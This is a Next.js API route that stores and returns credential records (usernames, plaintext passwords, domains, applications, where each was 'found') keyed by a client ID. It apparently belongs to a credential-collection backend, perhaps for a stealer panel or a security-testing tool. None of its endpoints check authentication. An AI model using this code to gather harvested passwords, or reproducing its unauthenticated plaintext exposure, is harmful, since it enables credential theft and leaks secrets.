import { NextRequest, NextResponse } from 'next/server'
import { recordCredential, getClientCredentials, getCredentialStats, searchCredentials } from '@/lib/sessions'

export async function GET(request: NextRequest) {
  try {
    const searchParams = request.nextUrl.searchParams
    const action = searchParams.get('action')
    const clientId = searchParams.get('clientId')
    const query = searchParams.get('q')

    if (!clientId) {
      return NextResponse.json(
        { error: 'clientId parameter is required' },
        { status: 400 }
      )
    }

    if (action === 'stats') {
      const stats = getCredentialStats(clientId)
      return NextResponse.json(stats)
    }

    if (action === 'search' && query) {
      const results = searchCredentials(clientId, query)
      return NextResponse.json(results)
    }

    const credentials = getClientCredentials(clientId)
    return NextResponse.json(credentials)
  } catch (error) {
    console.error('[Credentials API] Error:', error)
    return NextResponse.json(
      { error: 'Failed to fetch credentials' },
      { status: 500 }
    )
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()

    const credential = recordCredential({
      client_id: body.client_id,
      credential_type: body.credential_type,
      username: body.username,
      password: body.password,
      domain: body.domain,
      application: body.application,
      found_at: body.found_at,
    })

    return NextResponse.json(credential, { status: 201 })
  } catch (error) {
    console.error('[Credentials API] Error:', error)
    return NextResponse.json(
      { error: 'Failed to record credential' },
      { status: 400 }
    )
  }
}
